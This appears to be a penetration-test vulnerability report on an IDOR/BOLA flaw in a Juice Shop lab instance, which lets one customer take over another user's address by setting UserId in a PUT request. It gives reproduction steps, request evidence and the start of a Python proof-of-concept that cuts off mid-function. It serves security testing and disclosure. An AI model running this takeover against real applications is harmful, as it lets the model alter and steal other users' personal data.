╭─ VULN-0012 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: IDOR/BOLA in Address Update Allows Cross-User Address Takeover       │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 8.1                                                             │
│                                                                              │
│  Target: http://juiceshop:3000                                               │
│                                                                              │
│  Endpoint: /api/Addresss/{id}                                                │
│                                                                              │
│  Method: PUT                                                                 │
│                                                                              │
│  CVSS Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N                            │
│                                                                              │
│  Description                                                                 │
│  An insecure direct object reference (IDOR) / broken object level            │
│  authorization (BOLA) vulnerability was identified in the address            │
│  management API. A standard authenticated user can update an address         │
│  belonging to another user by directly referencing its numeric identifier    │
│  in the endpoint path. Additionally, the API accepts a client-supplied       │
│  UserId field during updates, enabling an attacker to reassign ownership of  │
│  the address object to their own account (“address takeover”).               │
│                                                                              │
│  This was validated using two standard customer accounts, where user A       │
│  successfully modified and took ownership of user B’s newly created address  │
│  via a direct PUT request.                                                   │
│                                                                              │
│  Impact                                                                      │
│  An attacker with any valid customer account can tamper with other users’    │
│  shipping/billing addresses and associated PII (full name, phone number,     │
│  street address, ZIP, city/state/country). By changing the UserId, the       │
│  attacker can effectively steal ownership of an address object, causing the  │
│  legitimate owner to lose visibility/control and potentially redirect        │
│  deliveries, abuse stored address data in downstream checkout workflows,     │
│  and facilitate fraud or account abuse.                                      │
│                                                                              │
│  Technical Analysis                                                          │
│  The application exposes address objects under the endpoint                  │
│  /api/Addresss/{id}. Authorization is not enforced at the object level       │
│  during updates: the backend processes PUT requests for any address ID       │
│  without verifying that the authenticated user owns the targeted address.    │
│                                                                              │
│  Furthermore, the update handler trusts the UserId field from the client     │
│  payload. This allows an attacker to overwrite the owner reference and       │
│  “move” the address object to their own account. The issue indicates         │
│  missing server-side authorization checks and missing server-side            │
│  allowlisting of writable fields for address updates.                        │
│                                                                              │
│  PoC Description                                                             │
│  Steps to reproduce:                                                         │
│                                                                              │
│  1) Authenticate as user B and create an address:                            │
│     - POST /api/Addresss                                                     │
│     - Observe the returned address id and UserId (owner).                    │
│                                                                              │
│  2) Authenticate as user A (a different customer) and take over user B’s     │
│  address:                                                                    │
│     - PUT /api/Addresss/{addressId_from_step_1}                              │
│     - Provide modified address fields and set "UserId" to user A’s user ID.  │
│     - Observe the response shows success and UserId reassigned to user A.    │
│                                                                              │
│  3) Verify takeover via listing:                                             │
│     - GET /api/Addresss as user A now includes the taken-over address.       │
│     - GET /api/Addresss as user B no longer includes the taken-over          │
│  address.                                                                    │
│                                                                              │
│  4) (Cleanup) Restore the address to user B by repeating PUT                 │
│  /api/Addresss/{id} as user B with "UserId" set back to user B.              │
│                                                                              │
│  Evidence from captured traffic:                                             │
│  - Address creation as owner (user B): request 3346 (201 Created) returned   │
│  id=10 and UserId=29                                                         │
│  - Takeover as attacker (user A): request 3349 (200 OK) returned UserId=28   │
│  and fullName="TAKEN OVER"                                                   │
│  - Post-takeover verification via listing:                                   │
│    - Attacker list: request 3350 shows the taken-over address under          │
│  UserId=28                                                                   │
│    - Owner list: request 3351 no longer includes id=10                       │
│  - Restoration (cleanup): request 3352 returns UserId=29 for id=10           │
│                                                                              │
│  PoC Code                                                                    │
│  import json                                                                 │
│  import sys                                                                  │
│  from typing import Tuple                                                    │
│                                                                              │
│  import requests                                                             │
│                                                                              │
│  BASE = "http://juiceshop:3000"                                              │
│                                                                              │
│                                                                              │
│  def login(email: str, password: str) -> Tuple[str, int]:                    │
│      r = requests.post(                                                      │
│          f"{BASE}/rest/user/login",                                          │
│          headers={"Content-Type": "application/json"},                       │
│          data=json.dumps({"email": email, "password": password}),            │
│          timeout=15,                                                         │
│      )                                                                       │
│      r.raise_for_status()                                                    │
│      j = r.json()                                                            │
│      return j["authentication"]["token"], j["authentication"]["bid"]         │
│                                                                              │
│                                                                              │
│  def api(method: str, path: str, token: str, body: dict | None = None) ->    │
